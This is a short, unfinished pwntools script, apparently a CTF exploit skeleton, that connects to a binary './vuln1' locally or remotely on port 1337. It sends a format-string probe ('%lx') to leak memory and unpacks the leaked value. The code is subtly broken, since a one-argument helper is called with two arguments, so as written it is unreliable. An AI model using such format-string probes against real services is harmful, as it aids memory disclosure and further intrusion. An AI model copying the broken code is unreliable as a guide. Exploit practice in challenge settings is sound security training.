from pwn import *

context(terminal=['tmux','new-window'])

local = True

fname = './vuln1'
host,port = '',1337


r = process(fname) if local else remote(host, port)

def sendline(payload):
	log.info(r.recvuntil('>> '))
	r.sendline(payload)

if __name__=='__main__':	
	sendline(r,'%lx')
	r.recvline()
	o = u32(r.recvline()[:-1])










